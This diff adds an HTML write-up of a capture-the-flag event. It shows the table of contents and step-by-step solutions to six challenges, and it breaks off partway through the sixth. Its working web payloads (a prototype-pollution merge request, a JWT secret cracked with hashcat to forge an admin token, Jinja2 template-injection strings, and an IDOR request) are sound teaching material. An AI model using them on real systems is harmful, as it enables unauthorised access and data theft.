@@ -1,0 +1,3134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>MythX CTF — Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+<style>
+  :root {
+    --bg: #0b0d12;
+    --surface: #12151d;
+    --border: #1e2330;
+    --accent: #00f5a0;
+    --accent2: #00c8ff;
+    --accent3: #ff4d6d;
+    --accent4: #f7c948;
+    --text: #dce4f0;
+    --muted: #6b7694;
+    --code-bg: #0d1117;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'DM Sans', sans-serif;
+    font-weight: 300;
+    line-height: 1.75;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Grain overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 9999;
+    opacity: 0.4;
+  }
+
+  /* ── HEADER ── */
+  header {
+    position: relative;
+    padding: 80px 40px 60px;
+    max-width: 900px;
+    margin: 0 auto;
+    overflow: hidden;
+  }
+
+  .header-glow {
+    position: absolute;
+    top: -60px; left: -80px;
+    width: 500px; height: 300px;
+    background: radial-gradient(ellipse at center, rgba(0,245,160,.12) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .eyebrow {
+    font-family: 'Space Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.25em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .eyebrow::before {
+    content: '';
+    display: inline-block;
+    width: 28px; height: 1px;
+    background: var(--accent);
+  }
+
+  h1 {
+    font-family: 'Syne', sans-serif;
+    font-size: clamp(2.4rem, 6vw, 4rem);
+    font-weight: 800;
+    line-height: 1.05;
+    letter-spacing: -0.02em;
+    color: #fff;
+    margin-bottom: 20px;
+  }
+
+  h1 span {
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .subtitle {
+    font-size: 1rem;
+    color: var(--muted);
+    max-width: 520px;
+    line-height: 1.6;
+  }
+
+  /* ── TOC ── */
+  .toc-wrapper {
+    max-width: 900px;
+    margin: 0 auto 60px;
+    padding: 0 40px;
+  }
+
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 28px 32px;
+    border-radius: 4px;
+  }
+
+  .toc-title {
+    font-family: 'Space Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 16px;
+  }
+
+  .toc ol {
+    list-style: none;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 6px 40px;
+  }
+
+  .toc li { counter-increment: toc; }
+  .toc a {
+    color: var(--muted);
+    text-decoration: none;
+    font-size: 0.875rem;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    transition: color .2s;
+  }
+  .toc a:hover { color: var(--accent); }
+  .toc a::before {
+    content: counter(toc, decimal-leading-zero);
+    font-family: 'Space Mono', monospace;
+    font-size: 10px;
+    color: var(--border);
+    min-width: 22px;
+  }
+
+  /* ── MAIN ── */
+  main {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 40px 100px;
+  }
+
+  /* ── CHALLENGE CARD ── */
+  .challenge {
+    margin-bottom: 72px;
+    animation: fadeUp .5s ease both;
+  }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .challenge-header {
+    display: flex;
+    align-items: flex-start;
+    gap: 20px;
+    margin-bottom: 28px;
+    padding-bottom: 24px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .challenge-num {
+    font-family: 'Space Mono', monospace;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--bg);
+    background: var(--accent);
+    padding: 4px 9px;
+    border-radius: 3px;
+    flex-shrink: 0;
+    margin-top: 4px;
+  }
+
+  .challenge-num.web   { background: var(--accent); color: #000; }
+  .challenge-num.misc  { background: var(--accent4); color: #000; }
+  .challenge-num.steg  { background: var(--accent2); color: #000; }
+  .challenge-num.crypto{ background: var(--accent3); color: #fff; }
+
+  .challenge-title-wrap h2 {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.6rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 6px;
+  }
+
+  .tags {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+  }
+
+  .tag {
+    font-family: 'Space Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.08em;
+    padding: 2px 8px;
+    border-radius: 2px;
+    border: 1px solid;
+  }
+  .tag.web   { color: var(--accent);  border-color: var(--accent);  }
+  .tag.misc  { color: var(--accent4); border-color: var(--accent4); }
+  .tag.steg  { color: var(--accent2); border-color: var(--accent2); }
+  .tag.crypto{ color: var(--accent3); border-color: var(--accent3); }
+
+  /* summary box */
+  .summary-box {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 20px 24px;
+    margin-bottom: 28px;
+    font-size: 0.9rem;
+    color: var(--muted);
+    line-height: 1.7;
+  }
+
+  /* ── STEPS ── */
+  .step {
+    margin-bottom: 28px;
+  }
+
+  .step-label {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 12px;
+  }
+
+  .step-num {
+    font-family: 'Space Mono', monospace;
+    font-size: 10px;
+    color: var(--muted);
+    border: 1px solid var(--border);
+    padding: 2px 7px;
+    border-radius: 2px;
+    flex-shrink: 0;
+  }
+
+  .step h3 {
+    font-family: 'Syne', sans-serif;
+    font-size: 1rem;
+    font-weight: 700;
+    color: #c8d8f0;
+  }
+
+  .step p, .step li {
+    font-size: 0.92rem;
+    color: var(--text);
+    margin-bottom: 8px;
+    line-height: 1.75;
+  }
+
+  /* code blocks */
+  .code-block {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+    margin: 14px 0;
+    font-family: 'Space Mono', monospace;
+  }
+
+  .code-lang {
+    background: var(--border);
+    font-size: 10px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--muted);
+    padding: 6px 14px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .code-lang::before {
+    content: '';
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: var(--accent);
+    display: inline-block;
+  }
+
+  pre {
+    padding: 18px 20px;
+    overflow-x: auto;
+    font-size: 0.78rem;
+    line-height: 1.65;
+    color: #a8d8b0;
+  }
+
+  pre .kw  { color: var(--accent2); }
+  pre .str { color: var(--accent4); }
+  pre .cm  { color: var(--muted); font-style: italic; }
+  pre .num { color: var(--accent3); }
+
+  /* response box */
+  .response-block {
+    background: #0a1a10;
+    border: 1px solid rgba(0,245,160,.2);
+    border-radius: 4px;
+    overflow: hidden;
+    margin: 14px 0;
+  }
+
+  .response-block .code-lang { color: var(--accent); }
+  .response-block pre { color: #7dffc0; }
+
+  /* flag box */
+  .flag-box {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    background: linear-gradient(90deg, rgba(0,245,160,.07), transparent);
+    border: 1px solid rgba(0,245,160,.35);
+    border-radius: 4px;
+    padding: 18px 24px;
+    margin-top: 28px;
+  }
+
+  .flag-icon {
+    font-size: 1.4rem;
+    flex-shrink: 0;
+  }
+
+  .flag-label {
+    font-family: 'Space Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 4px;
+  }
+
+  .flag-value {
+    font-family: 'Space Mono', monospace;
+    font-size: 0.9rem;
+    color: #fff;
+    word-break: break-all;
+  }
+
+  /* divider */
+  .divider {
+    height: 1px;
+    background: linear-gradient(90deg, var(--accent), transparent);
+    margin: 64px 0;
+    opacity: 0.3;
+  }
+
+  /* explanation block */
+  .explanation {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent2);
+    border-radius: 4px;
+    padding: 20px 24px;
+    margin-top: 20px;
+    font-size: 0.9rem;
+    color: var(--muted);
+    line-height: 1.8;
+  }
+
+  .explanation strong { color: var(--text); font-weight: 500; }
+
+  /* inline code */
+  code {
+    font-family: 'Space Mono', monospace;
+    font-size: 0.8em;
+    background: rgba(255,255,255,.06);
+    padding: 1px 6px;
+    border-radius: 3px;
+    color: var(--accent2);
+  }
+
+  /* ── FOOTER ── */
+  footer {
+    text-align: center;
+    padding: 40px;
+    font-family: 'Space Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--border);
+  }
+
+  @media (max-width: 600px) {
+    header, .toc-wrapper, main { padding-left: 20px; padding-right: 20px; }
+    .toc ol { grid-template-columns: 1fr; }
+    .challenge-header { flex-direction: column; gap: 10px; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-glow"></div>
+  <h1>MythX<br/>CTF <span>Writeup</span></h1>
+  <p class="subtitle">Detailed solutions covering prototype pollution, JWT attacks, steganography, SSTI, IDOR, path traversal, heap exploitation, format strings, forensics, and OSINT.</p>
+  <div style="margin-top:28px;display:flex;align-items:center;gap:16px;flex-wrap:wrap;">
+    <span style="font-family:'Space Mono',monospace;font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:#6b7694;">Team</span>
+    <span style="font-family:'Syne',sans-serif;font-size:1.1rem;font-weight:800;color:#f54e00;letter-spacing:0.05em;">Rudra_Root</span>
+    <span style="width:1px;height:18px;background:#1e2330;display:inline-block;"></span>
+    <span style="font-family:'Space Mono',monospace;font-size:0.75rem;color:#00c8ff;">BytePing</span>
+    <span style="font-family:'Space Mono',monospace;font-size:0.75rem;color:#f7c948;">d3v10u5</span>
+    <span style="font-family:'Space Mono',monospace;font-size:0.75rem;color:#ff4d6d;">d3adlock</span>
+    <span style="font-family:'Space Mono',monospace;font-size:0.75rem;color:#9b59b6;">Sp1d3r</span>
+  </div>
+</header>
+
+<div class="toc-wrapper">
+  <div class="toc">
+    <div class="toc-title">Table of Contents</div>
+    <ol>
+      <li><a href="#ch1">ProfileHub — Prototype Pollution</a></li>
+      <li><a href="#ch2">JWT Weak Secret</a></li>
+      <li><a href="#ch3">Hidden ZIP in PNG</a></li>
+      <li><a href="#ch4">Suspicious Transmission</a></li>
+      <li><a href="#ch5">Card Studio — SSTI</a></li>
+      <li><a href="#ch6">Staff Dashboard — IDOR</a></li>
+      <li><a href="#ch7">Cookie Auth</a></li>
+      <li><a href="#ch8">UserHub — Mass Assignment</a></li>
+      <li><a href="#ch9">DocViewer — Path Traversal</a></li>
+      <li><a href="#ch10">Cracked Seal — JWT Crack</a></li>
+      <li><a href="#ch11">Header Hunter</a></li>
+      <li><a href="#ch12">Dojo Scrolls — Heap Overflow</a></li>
+      <li><a href="#ch13">Greeting Service — Format String</a></li>
+      <li><a href="#ch14">Note Manager — tcache Poisoning</a></li>
+      <li><a href="#ch15">Ping Tool — Command Injection</a></li>
+      <li><a href="#ch16">API Gateway — Header Injection</a></li>
+      <li><a href="#ch17">The Third Path — Forensics</a></li>
+      <li><a href="#ch18">Two-Point-ThreeSix — OSINT</a></li>
+      <li><a href="#ch19">Two-Point-ThreeSix Part 2 — OSINT</a></li>
+      <li><a href="#ch20">JS Vault — Client-Side JS</a></li>
+      <li><a href="#ch21">Source Dive — Source Map Leak</a></li>
+      <li><a href="#ch22">Redirect Maze — HTTP Headers</a></li>
+      <li><a href="#ch23">Disallowed Path — robots.txt</a></li>
+      <li><a href="#ch24">Parsing the Unknown — PNG Steg</a></li>
+      <li><a href="#ch25">Just For Fun — Video Reflection</a></li>
+      <li><a href="#ch26">FeedBack — Form Challenge</a></li>
+      <li><a href="#ch27">The Encoding Onion — Multi-Layer</a></li>
+      <li><a href="#ch28">XOR Known Plaintext — Chosen PT</a></li>
+      <li><a href="#ch29">RSA Common Factor — GCD Attack</a></li>
+      <li><a href="#ch30">Shinchi — Flutter APK Reverse</a></li>
+      <li><a href="#ch31">Rot-13 Decryptor — Caesar Cipher</a></li>
+      <li><a href="#ch32">Captured in Silence — OSINT</a></li>
+    </ol>
+  </div>
+</div>
+
+<main>
+
+<!-- ─────────────── 1. ProfileHub ─────────────── -->
+<div class="challenge" id="ch1">
+  <div class="challenge-header">
+    <span class="challenge-num web">01</span>
+    <div class="challenge-title-wrap">
+      <h2>ProfileHub</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">Prototype Pollution</span>
+        <span class="tag web">WASM Bypass</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    ProfileHub features a client-side WASM validator and an <code>/api/merge</code> endpoint that deep-merges user-supplied JSON objects. The challenge claims its frontend validator makes backend attacks impossible. The goal is to access the <code>/admin</code> page and retrieve the flag, which is restricted to admins only.
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 01</span>
+      <h3>Understanding the Application</h3>
+    </div>
+    <p>The WASM validator only runs in the browser and merely checks that the input is printable ASCII. The real vulnerability lies server-side: the <code>/api/merge</code> endpoint deep-merges two user-supplied JSON objects and returns the result. If the merge function is <strong>NOT</strong> safe, classic prototype pollution is possible by injecting properties into the prototype chain using the <code>__proto__</code> key.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 02</span>
+      <h3>Exploiting Prototype Pollution</h3>
+    </div>
+    <p>By sending a JSON payload with a <code>__proto__</code> key, it is possible to grant admin rights to the session:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>curl -s -X POST 'http://chall-1fc1c215.evt-207.glabs.ctf7.com/api/merge' \
+  -H 'Content-Type: application/json' \
+  --data '{"base":{},"override":{"__proto__":{"isAdmin":true}}}'</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 03</span>
+      <h3>Accessing the Admin Panel</h3>
+    </div>
+    <p>If the backend is vulnerable, admin checks like <code>if (user.isAdmin)</code> will now pass for the session. Access the <code>/admin</code> page:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>curl -s 'http://chall-1fc1c215.evt-207.glabs.ctf7.com/admin'</pre>
+    </div>
+    <p>This page contains a script which loads the flag by fetching <code>/api/profile</code>.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 04</span>
+      <h3>Retrieving the Flag</h3>
+    </div>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>curl -s 'http://chall-1fc1c215.evt-207.glabs.ctf7.com/api/profile'</pre>
+    </div>
+    <div class="response-block">
+      <div class="code-lang">json — response</div>
+      <pre>{
+  "role": "admin",
+  "message": "Welcome, administrator.",
+  "flag": "ctf7{w4sm_pr0t0_p0llut10n_ch41n_29367265}"
+}</pre>
+    </div>
+  </div>
+
+  <div class="explanation">
+    This attack works because the backend deep merge function fails to sanitize dangerous keys like <strong><code>__proto__</code></strong>. By polluting the global prototype, all user objects now behave as admins, unlocking the <code>/admin</code> panel and flag. The WASM guard is useless — it runs only in the browser and cannot protect the server. Never trust client-side sanitization and never deep merge untrusted objects in Node.js!
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{w4sm_pr0t0_p0llut10n_ch41n_29367265}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ─────────────── 2. JWT Weak Secret ─────────────── -->
+<div class="challenge" id="ch2">
+  <div class="challenge-header">
+    <span class="challenge-num crypto">02</span>
+    <div class="challenge-title-wrap">
+      <h2>JWT Weak Secret</h2>
+      <div class="tags">
+        <span class="tag crypto">Crypto</span>
+        <span class="tag crypto">JWT</span>
+        <span class="tag crypto">Hashcat</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The authentication portal utilizes JSON Web Tokens (JWTs). Although the signing key is described as "rock-solid," a guest account is available via <code>guest:guest</code>. The objective is to bypass restrictions on the <code>/admin</code> endpoint.
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 01</span>
+      <h3>Authenticate as Guest to Retrieve JWT</h3>
+    </div>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>curl -X POST http://chall-74b48b09.evt-246.glabs.ctf7.com/login \
+     -H "Content-Type: application/json" \
+     -d '{"username":"guest", "password":"guest"}'</pre>
+    </div>
+    <div class="response-block">
+      <div class="code-lang">json — response</div>
+      <pre>{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIn0.9I4AjxfWP9qp8qeBqcAP9y-YjEUbpVAZgveZ7Ey90bA"}</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 02</span>
+      <h3>Identifying and Cracking the Signing Key</h3>
+    </div>
+    <p>Given the "rock-solid" hint (suggesting <code>rockyou.txt</code>), a brute-force attack was initiated using Hashcat:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIn0.9I4AjxfWP9qp8qeBqcAP9y-YjEUbpVAZgveZ7Ey90bA" > jwt.txt
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt</pre>
+    </div>
+    <p>The revealed secret key is: <code>secret123</code></p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 03</span>
+      <h3>Forging an Administrative Token</h3>
+    </div>
+    <p>The payload requires a role escalation from:</p>
+    <div class="code-block">
+      <div class="code-lang">json — original</div>
+      <pre>{"sub": "guest", "role": "user"}</pre>
+    </div>
+    <p>to the administrative role:</p>
+    <div class="code-block">
+      <div class="code-lang">json — forged</div>
+      <pre>{"sub": "guest", "role": "admin"}</pre>
+    </div>
+    <p>Using jwt.io with the discovered key <code>secret123</code>, the following forged token was generated:</p>
+    <div class="code-block">
+      <div class="code-lang">token</div>
+      <pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiJ9.lohUuBC44p2u53tAQ8jGvZSAAHYmAvT6pgn4wLs4DPs</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 04</span>
+      <h3>Accessing the Admin Panel</h3>
+    </div>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>curl -X GET http://chall-74b48b09.evt-246.glabs.ctf7.com/admin \
+     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiJ9.lohUuBC44p2u53tAQ8jGvZSAAHYmAvT6pgn4wLs4DPs"</pre>
+    </div>
+  </div>
+
+  <div class="explanation">
+    The "rock-solid" security claim was undermined by a weak signing key that was easily compromised using a standard wordlist. By forging a JWT with admin privileges, authentication checks were successfully bypassed and the flag was retrieved.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{cant_guess_jwt_f08a3873}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ─────────────── 3. Hidden ZIP in PNG ─────────────── -->
+<div class="challenge" id="ch3">
+  <div class="challenge-header">
+    <span class="challenge-num steg">03</span>
+    <div class="challenge-title-wrap">
+      <h2>Hidden ZIP in PNG</h2>
+      <div class="tags">
+        <span class="tag steg">Steganography</span>
+        <span class="tag steg">Forensics</span>
+        <span class="tag steg">Binwalk</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A PNG image appeared to be an ordinary gradient; however, the challenge description hinted at concealed information. Based on this, data was suspected to have been appended beyond the standard image file trailer.
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 01</span>
+      <h3>Identifying Hidden Data</h3>
+    </div>
+    <p>An analysis of the file was initiated using <code>binwalk</code> to detect any embedded signatures:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>binwalk -e suspect.png</pre>
+    </div>
+    <p>The tool successfully identified a ZIP archive appended to the end of the PNG data.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 02</span>
+      <h3>Extracting the ZIP Archive</h3>
+    </div>
+    <p>Using the extraction flag, binwalk automatically carved the archive into the <code>_suspect.png.extracted</code> directory.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 03</span>
+      <h3>Finding the ZIP Password</h3>
+    </div>
+    <p>Attempting to unzip the archive resulted in a password prompt. <code>exiftool</code> was used to inspect the image metadata for potential clues:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>exiftool suspect.png</pre>
+    </div>
+    <p>The metadata revealed a comment containing the cleartext password:</p>
+    <div class="response-block">
+      <div class="code-lang">output</div>
+      <pre>Comment: password=ctf72026</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 04</span>
+      <h3>Unzipping and Retrieving the Flag</h3>
+    </div>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>unzip -P ctf72026 _suspect.png.extracted/&lt;zipfilename&gt;.zip</pre>
+    </div>
+    <p>The archive contained <code>flag.txt</code>, which revealed the final flag upon reading.</p>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{something}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ─────────────── 4. Suspicious Transmission ─────────────── -->
+<div class="challenge" id="ch4">
+  <div class="challenge-header">
+    <span class="challenge-num steg">04</span>
+    <div class="challenge-title-wrap">
+      <h2>Suspicious Transmission</h2>
+      <div class="tags">
+        <span class="tag steg">Steganography</span>
+        <span class="tag steg">Audio LSB</span>
+        <span class="tag steg">Python</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The provided <code>challenge.wav</code> file appears to be a standard 440 Hz tone. Based on the challenge description, a hidden message was suspected to be concealed within the audio data using LSB (Least Significant Bit) steganography.
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">METHODOLOGY</span>
+      <h3>How LSB Audio Steganography Works</h3>
+    </div>
+    <p>In audio steganography, data is often hidden by modifying the least significant bits of each PCM sample. By analyzing the 16-bit PCM structure, it is possible to extract these bits sequentially to reconstruct the null-terminated flag.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 01</span>
+      <h3>Python Extraction Script</h3>
+    </div>
+    <p>A Python script was developed to iterate through the WAV frames and extract the LSB from each sample to recover the plaintext message:</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>import struct
+import wave
+
+def extract_lsb_message(path):
+    with wave.open(path, "rb") as wf:
+        n_frames = wf.getnframes()
+        raw = wf.readframes(n_frames)
+        samples = struct.unpack(f"<{n_frames}h", raw)
+    bits = [s & 1 for s in samples]
+    out = []
+    for i in range(0, len(bits), 8):
+        byte = 0
+        for b in bits[i:i+8]:
+            byte = (byte << 1) | b
+        if byte == 0: break
+        out.append(chr(byte))
+    return "".join(out)
+
+print(extract_lsb_message("challenge.wav"))</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 02</span>
+      <h3>Result</h3>
+    </div>
+    <p>Executing the extraction script yields the following hidden message:</p>
+    <div class="response-block">
+      <div class="code-lang">output</div>
+      <pre>ctf7{transmission_succesfull_tha_kya_46c93845}</pre>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{transmission_succesfull_tha_kya_46c93845}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ─────────────── 5. Card Studio ─────────────── -->
+<div class="challenge" id="ch5">
+  <div class="challenge-header">
+    <span class="challenge-num web">05</span>
+    <div class="challenge-title-wrap">
+      <h2>Card Studio</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">SSTI</span>
+        <span class="tag web">Jinja2</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The challenge highlights a "powerful template engine" used for generating greeting cards. User-supplied input is reflected in the card preview via the <code>/preview</code> endpoint, suggesting a potential Server-Side Template Injection point.
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 01</span>
+      <h3>Reconnaissance</h3>
+    </div>
+    <p>The challenge description highlights a "powerful template engine" used for generating greeting cards. User-supplied input is reflected in the card preview via the <code>/preview</code> endpoint, suggesting a potential injection point.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 02</span>
+      <h3>Identifying Template Injection</h3>
+    </div>
+    <p>To determine if the engine evaluates template logic, a mathematical payload was submitted in the Message field:</p>
+    <div class="code-block">
+      <div class="code-lang">payload</div>
+      <pre>{{7*7}}</pre>
+    </div>
+    <p>The preview rendered the following result:</p>
+    <div class="response-block">
+      <div class="code-lang">output</div>
+      <pre>49</pre>
+    </div>
+    <p>This evaluation confirms an SSTI vulnerability, likely involving Jinja2 or a similar engine that processes <code>{{ ... }}</code> syntax.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 03</span>
+      <h3>Extracting Application Configuration</h3>
+    </div>
+    <p>To inspect the backend environment, the global configuration object was dumped:</p>
+    <div class="code-block">
+      <div class="code-lang">payload</div>
+      <pre>{{ config }}</pre>
+    </div>
+    <p>The response exposed the application's configuration dictionary, which contained the flag:</p>
+    <div class="response-block">
+      <div class="code-lang">output</div>
+      <pre>&lt;Config {... 'FLAG': 'ctf7{studio_secrets_unlocked_7d82574c}' ...}&gt;</pre>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{studio_secrets_unlocked_7d82574c}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ─────────────── 6. Staff Dashboard ─────────────── -->
+<div class="challenge" id="ch6">
+  <div class="challenge-header">
+    <span class="challenge-num web">06</span>
+    <div class="challenge-title-wrap">
+      <h2>Staff Dashboard</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">IDOR</span>
+        <span class="tag web">API</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The application features a staff-oriented dashboard designed for profile management. Given guest credentials, the objective is to determine if user data is effectively isolated or if lateral access to other accounts is possible.
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 01</span>
+      <h3>Authenticate as Guest</h3>
+    </div>
+    <p>Analysis was initiated by authenticating at the target URL with the provided credentials:</p>
+    <div class="code-block">
+      <div class="code-lang">credentials</div>
+      <pre>Username: guest
+Password: guest123</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 02</span>
+      <h3>Analysis of the Profile Interface</h3>
+    </div>
+    <p>Upon successful login, the dashboard displays personal information such as notes and email addresses. A significant architectural clue was observed at the bottom of the interface:</p>
+    <div class="code-block">
+      <div class="code-lang">hint</div>
+      <pre>Profile data served via internal API — GET /api/user/1</pre>
+    </div>
+    <p>This indicates that the frontend retrieves profile records via an API endpoint that utilizes a numeric ID to specify the user.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 03</span>
+      <h3>Exploiting Insecure Direct Object Reference</h3>
+    </div>
+    <p>To test for IDOR, records belonging to another user were requested by manually incrementing the ID within the URL:</p>
+    <div class="code-block">
+      <div class="code-lang">url</div>
+      <pre>http://chall-5e4bc8df.evt-246.glabs.ctf7.com/api/user/2</pre>
+    </div>
+    <p>Accessing this endpoint while authenticated as "guest" successfully bypassed authorization, returning the administrator's JSON profile and the flag:</p>
+    <div class="response-block">
+      <div class="code-lang">json — response</div>
+      <pre>{
+  "avatar_color": "#ff6b6b",
+  "email": "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0263666f6b6c42617664352c6e6d61636e">[email&#160;protected]</a>",
+  "id": 2,
+  "notes": "Admin credentials rotated. Flag stored securely: ctf7{org_internal_breach_0bb1047b}",
+  "role": "admin",
+  "username": "admin"
+}</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 04</span>
+      <h3>Explanation</h3>
+    </div>
+    <div class="explanation">
